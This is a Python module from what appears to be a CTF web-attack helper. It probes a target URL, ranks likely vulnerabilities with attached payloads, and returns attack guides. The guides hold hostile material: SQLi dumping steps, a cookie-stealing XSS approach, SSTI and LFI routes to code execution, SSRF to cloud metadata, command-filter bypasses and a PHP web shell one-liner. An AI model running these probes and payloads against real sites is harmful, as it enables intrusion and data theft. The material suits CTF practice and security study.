# -*- coding: utf-8 -*-
"""url_analyzer._analyze -- URL / parameter triage and human-readable attack guidance.

从 yang_web/core/url_analyzer.py 机械拆分而来, 逐行搬运, 行为等价。
"""

from urllib.parse import urlparse, parse_qs, unquote, urlencode, urlunparse, quote
from typing import List, Dict, Tuple, Optional, Callable
import re
from yang_web.core.php_logic import analyze_and_solve as _php_logic_solve

from ._engines import (SmartFingerprinter)
from ._http import (_extract_title, crawl_page, send_request)
from ._signatures import (ATTACK_PAYLOADS, PARAM_SIGNATURES, PATH_PATTERNS)



# ============================================================================
#  Main URL Analyzer
# ============================================================================

def analyze_url(url: str) -> Dict:
    """Analyze a URL for vulnerability indicators.

    Pipeline:
        1. Parse URL query params, match against PARAM_SIGNATURES
        2. Match URL path against PATH_PATTERNS
        3. If no params found, crawl page for forms and params
        4. Build evidence, aggregate confidence scores
        5. Optionally scan common paths as fallback

    Returns:
        {"url": str, "parsed": dict, "results": [dict],
         "stats": dict, "crawl": dict or None, "error": str or None}
    """
    TYPE_META = {
        "SQLi":   ("SQL 注入", "\U0001F489"),
        "XSS":    ("跨站脚本", "\U0001F480"),
        "SSTI":   ("模板注入", "\U0001F9E9"),
        "LFI":    ("文件包含", "\U0001F4C2"),
        "SSRF":   ("服务端请求伪造", "\U0001F310"),
        "RCE":    ("远程命令执行", "\U0001F4BB"),
        "Upload": ("文件上传漏洞", "\U0001F4E4"),
        "PHP":    ("PHP 漏洞", "\U0001F418"),
    }
    empty = {
        "url": url, "parsed": {"scheme": "", "host": "", "path": "", "query": ""},
        "results": [],
        "stats": {"url_params_count": 0, "signatures_matched": 0,
                  "path_patterns_matched": 0, "vuln_types_found": 0},
        "crawl": None, "error": None,
    }
    try:
        if not url or not url.strip():
            return {**empty, "error": "Empty URL"}
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        parsed = urlparse(url)
        host = parsed.hostname or ""
        path = parsed.path or ""
        query = parsed.query or ""
        evidence: Dict[str, Dict] = {}
        sig_count = 0
        fp_result = None
        probe_body = ""
        probe_headers = {}

        # Step 0: Always fetch page for smart source-code fingerprinting
        try:
            probe_resp = send_request(url, timeout=5)
            if probe_resp.get('ok'):
                probe_body = probe_resp.get('body', '')
                probe_headers = dict(probe_resp.get('headers', {}))
                fingerprinter = SmartFingerprinter()
                fp_result = fingerprinter.fingerprint(probe_headers, probe_body, url)
                fp_result['_url'] = url
        except Exception:
            pass

        # Step 1: Query parameters
        if query:
            params = parse_qs(query, keep_blank_values=True)
            for pn, pv in params.items():
                pl = pn.lower()
                pval = unquote(pv[0]) if pv else ""
                if pl in PARAM_SIGNATURES:
                    for vt, cf, rs in PARAM_SIGNATURES[pl]:
                        _add_ev(evidence, vt, cf, rs, pn)
                        sig_count += 1
                else:
                    for sig, matches in PARAM_SIGNATURES.items():
                        if len(sig) > 1 and sig in pl:
                            for vt, cf, rs in matches:
                                _add_ev(evidence, vt, int(cf * 0.7),
                                        f"(partial) {rs}", pn)
                                sig_count += 1
                if re.match(r"^\d+$", pval):
                    _add_ev(evidence, "SQLi", 30,
                            f"Param {pn} has numeric value, likely SQL target", pn)
        # Step 2: Path patterns
        pc = 0
        fpq = path + ("?" + query if query else "")
        for pat, vt, cb, rs in PATH_PATTERNS:
            if re.search(pat, fpq, re.IGNORECASE):
                _add_ev(evidence, vt, cb, rs, "")
                pc += 1
        # Step 3: Fallback for unknown params
        if query and not evidence:
            for pn in parse_qs(query, keep_blank_values=True):
                _add_ev(evidence, "SQLi", 35,
                        f"Unknown param {pn}, possible SQLi vector", pn)
                _add_ev(evidence, "XSS", 30,
                        f"Unknown param {pn}, possible XSS vector", pn)
        # Step 4: Crawl
        cr = None
        if not query and not evidence:
            cr = crawl_page(url)
            if cr.get("ok") and cr.get("discovered_params"):
                for pn in cr["discovered_params"]:
                    pl = pn.lower()
                    if pl in PARAM_SIGNATURES:
                        for vt, cf, rs in PARAM_SIGNATURES[pl]:
                            _add_ev(evidence, vt, cf, f"(crawled) {rs}", pn)
                    else:
                        matched = False
                        for sig, matches in PARAM_SIGNATURES.items():
                            if len(sig) > 1 and sig in pl:
                                for vt, cf, rs in matches:
                                    _add_ev(evidence, vt, int(cf * 0.7),
                                            f"(crawled) {rs}", pn)
                                matched = True
                        if not matched:
                            _add_ev(evidence, "SQLi", 30,
                                    f"(crawled) Unknown param {pn}", pn)
                            _add_ev(evidence, "XSS", 25,
                                    f"(crawled) Unknown param {pn}", pn)
            elif cr.get("ok"):
                ps = []
                cps = [
                    "/login.php", "/login", "/admin", "/admin.php",
                    "/index.php", "/flag", "/flag.php", "/robots.txt",
                    "/api", "/search.php", "/upload", "/upload.php",
                    "/download.php", "/view.php", "/news.php", "/user.php",
                    "/register.php", "/signup", "/source", "/www.zip",
                    "/.git/HEAD", "/phpinfo.php", "/debug", "/backup",
                ]
                bn = url.rstrip("/")
                for tp in cps:
                    tu = bn + tp
                    try:
                        rp = send_request(tu, timeout=3)
                        if rp["ok"] and rp["status"] not in (404, 403, 500):
                            ps.append({
                                "path": tp, "status": rp["status"],
                                "len": rp["body_len"],
                                "title": _extract_title(rp["body"])[:40],
                            })
                    except Exception:
                        pass
                if ps:
                    cr["paths_found"] = ps

        # Step 5: Source-level fingerprinting — boost confidence from code analysis
        if fp_result:
            for pv in fp_result.get('php_vulns', []):
                vt_type = pv['type']
                cf = pv['confidence']
                reason = f"(源码) {pv['reason']}: {pv['evidence'][:60]}"
                # Use fingerprint params as parameter names
                for pp in fp_result.get('php_params', []):
                    _add_ev(evidence, vt_type, cf, reason, pp['name'])
                if not fp_result.get('php_params'):
                    _add_ev(evidence, vt_type, cf, reason, '')
            # Boost based on CMS context
            cms = fp_result.get('cms', 'Unknown')
            tech_stack = fp_result.get('tech_stack', [])
            if cms != 'Unknown' and fp_result.get('cms_confidence', 0) >= 50:
                for tv in tech_stack[:2]:
                    # Give moderate boost to CMS-relevant vuln types
                    _add_ev(evidence, tv, 25, f"(CMS) {cms} 常见漏洞", '')
            # WAF detection doesn't prevent vulns, but reduces payload confidence later
            if fp_result.get('waf'):
                _add_ev(evidence, 'PHP', 15, f"(WAF) 检测到: {fp_result['waf']}", '')

        # Build results
        results = []
        for vt, info in sorted(evidence.items(), key=lambda x: -x[1]["confidence"]):
            meta = TYPE_META.get(vt, (vt, "?"))
            pls = ATTACK_PAYLOADS.get(vt, [])
            results.append({
                "type": vt, "type_cn": meta[0], "emoji": meta[1],
                "confidence": min(info["confidence"], 100),
                "reasons": info["reasons"], "params": list(info["params"]),
                "payloads": pls,
            })
        
        # ── v3.1: PHP Logic Analyzer — detect multi-layer bypass challenges ──
        php_bypass_plan = None
        if fp_result:
            php_source = fp_result.get('_clean_source', '')
            if php_source and ('if (' in php_source or 'if(' in php_source):
                try:
                    php_bypass_plan = _php_logic_solve(url, php_source, fingerprint=fp_result)
                    if php_bypass_plan and php_bypass_plan.get('total_layers', 0) >= 2:
                        # Add as a new vulnerability type
                        results.insert(0, {
                            "type": "PHP_BYPASS",
                            "type_cn": "PHP多层绕过",
                            "emoji": "\U0001F9E9",
                            "confidence": 100,
                            "reasons": [f"检测到{php_bypass_plan['solved_layers']}/{php_bypass_plan['total_layers']}层条件绕过"],
                            "params": [],
                            "payloads": [],
                            "_bypass_plan": php_bypass_plan,  # Internal use
                        })
                except Exception:
                    pass
        
        return {
            "url": url,
            "parsed": {"scheme": parsed.scheme, "host": host,
                       "path": path, "query": query},
            "results": results,
            "stats": {
                "url_params_count": len(parse_qs(query, keep_blank_values=True)) if query else 0,
                "signatures_matched": sig_count,
                "path_patterns_matched": pc,
                "vuln_types_found": len(results),
            },
            "crawl": cr if (cr and cr.get("ok")) else None,
            "fingerprint": fp_result,
            "php_bypass": php_bypass_plan,  # v3.1
            "error": None,
        }
    except Exception as ex:
        try:
            sc, ho, pa, qu = parsed.scheme, host, path, query
        except Exception:
            sc = ho = pa = qu = ""
        return {
            "url": url,
            "parsed": {"scheme": sc, "host": ho, "path": pa, "query": qu},
            "results": [],
            "stats": {"url_params_count": 0, "signatures_matched": 0,
                      "path_patterns_matched": 0, "vuln_types_found": 0},
            "crawl": None, "error": str(ex),
        }



def _add_ev(evidence, vt, cf, rs, pn):
    """Add vulnerability evidence to the evidence dict."""
    if vt not in evidence:
        evidence[vt] = {"confidence": 0, "reasons": [], "params": set()}
    evidence[vt]["confidence"] += cf
    if rs not in evidence[vt]["reasons"]:
        evidence[vt]["reasons"].append(rs)
    if pn:
        evidence[vt]["params"].add(pn)



def get_attack_guide(vuln_type: str) -> str:
    """Return a multi-line attack guide for a given vulnerability type.

    Args:
        vuln_type: SQLi, XSS, SSTI, LFI, SSRF, RCE, Upload, or PHP

    Returns:
        Multi-line string with attack methodology guide
    """
    guides = {
        "SQLi": (
            "=== SQL Injection Attack Guide ===\n"
            "\n"
            "1. [DETECT] Add single quote to trigger SQL error\n"
            "2. [CONFIRM] AND 1=1 / AND 1=2 comparison to confirm injection\n"
            "3. [COLUMNS] ORDER BY n probe to find column count\n"
            "4. [EXTRACT] UNION SELECT 1,2,3... to find visible columns\n"
            "5. [DUMP] database() then tables then columns then data\n"
            "\n"
            "Tips: Use error-based (updatexml/extractvalue) when UNION blocked.\n"
            "For blind SQLi, use sleep() or benchmark() for time-based detection."
        ),
        "XSS": (
            "=== Cross-site Scripting Attack Guide ===\n"
            "\n"
            "1. [PROBE] Test script tag - check if reflected\n"
            "2. [BYPASS] Use img onerror to bypass tag filters\n"
            "3. [BYPASS] SVG onload for alternative XSS vector\n"
            "4. [EXPLOIT] Cookie stealer payload to exfiltrate data\n"
            "\n"
            "Tips: In CTF, XSS is often used to steal admin cookies.\n"
            "Set up a simple HTTP listener: python3 -m http.server 8888"
        ),
        "SSTI": (
            "=== Server-Side Template Injection Guide ===\n"
            "\n"
            "1. [DETECT] {{7*7}} returns 49 = Jinja2/Twig SSTI\n"
            "2. [DETECT] ${7*7} returns 49 = Freemarker/Mako SSTI\n"
            "3. [IDENTIFY] Test syntax: {{}}, ${}, <%= %>, {php}{/php}\n"
            "4. [RCE] Use framework-specific RCE payloads\n"
            "5. [FLAG] Search and read: cat /flag or /flag.txt\n"
            "\n"
            "Tips: Jinja2 RCE is the most common in CTF.\n"
            "Try cycler.__init__.__globals__ access chain."
        ),
        "LFI": (
            "=== Local File Inclusion Attack Guide ===\n"
            "\n"
            "1. [BASIC] ../../../etc/passwd to confirm path traversal\n"
            "2. [BYPASS] URL-encoded: ..%2f..%2f..%2fetc/passwd\n"
            "3. [SOURCE] php://filter/convert.base64-encode/resource=flag.php\n"
            "4. [RCE] Log poisoning: inject PHP into access.log\n"
            "5. [RCE] php://input with POST body for RCE\n"
            "\n"
            "Tips: PHP filter chain is the go-to for CTF LFI.\n"
            "Combine with /proc/self/environ for environment leaks."
        ),
        "SSRF": (
            "=== Server-Side Request Forgery Guide ===\n"
            "\n"
            "1. [PROBE] http://127.0.0.1:22 to check SSH banner\n"
            "2. [FILE] file:///etc/passwd to read local files\n"
            "3. [CLOUD] http://169.254.169.254/ for AWS/GCP metadata\n"
            "4. [REDIS] gopher://127.0.0.1:6379 for CRLF injection\n"
            "5. [INTERNAL] Scan 192.168.x.x / 10.x.x.x for services\n"
            "\n"
            "Tips: CTF often combines file:// and gopher:// for full exploitation.\n"
            "Use a VPS to receive outbound connections for blind SSRF."
        ),
        "RCE": (
            "=== Remote Code Execution Attack Guide ===\n"
            "\n"
            "1. [COMMAND] ;id to check for uid= response\n"
            "2. [CHAINS] Try ; | || && %0a as separators\n"
            "3. [BYPASS] Space becomes ${IFS}, cat becomes ca\u0027t\n"
            "4. [FIND] ;find / -name flag* to locate flag file\n"
            "5. [READ] ;cat /flag to get the flag\n"
            "\n"
            "Tips: %0a (newline) often bypasses space/separator filters.\n"
            "Use $(cmd) or backtick substitution when ; is blocked."
        ),
        "Upload": (
            "=== File Upload Vulnerability Guide ===\n"
            "\n"
            "1. [PROBE] Upload a legitimate image and check response\n"
            "2. [BYPASS] Try extensions: .php3, .php4, .php5, .phtml\n"
            "3. [BYPASS] Case: .pHp, .PhP to bypass case-sensitive filters\n"
            "4. [BYPASS] Double: shell.php.jpg, shell.php%00.jpg\n"
            "5. [BYPASS] .htaccess upload to override handler\n"
            "6. [EXECUTE] Access uploaded shell for RCE\n"
            "\n"
            "Tips: The shell content matters less than bypassing filters.\n"
            "Common web shell: <?php system($_GET[\u0027cmd\u0027]); ?>"
        ),
        "PHP": (
            "=== PHP Vulnerability Attack Guide ===\n"
            "\n"
            "1. [SOURCE] php://filter/convert.base64-encode/resource=index.php\n"
            "2. [HASH] Magic hashes: 0e-prefix MD5 for loose comparison (==)\n"
            "3. [ARRAY] Array bypass: param[]=1 for strcmp/md5 juggling\n"
            "4. [WRAPPER] data://text/plain for include-based RCE\n"
            "5. [DESER] PHP deserialization via __wakeup/__destruct chains\n"
            "\n"
            "Tips: PHP type juggling is a unique attack surface.\n"
            "Look for loose comparisons (==) and strcmp usage."
        ),
    }
    return guides.get(
        vuln_type,
        f"=== {vuln_type} Attack Guide ===\n\n"
        f"No detailed guide available for this type.\n"
        f"Refer to the payload library for attack vectors."
    )
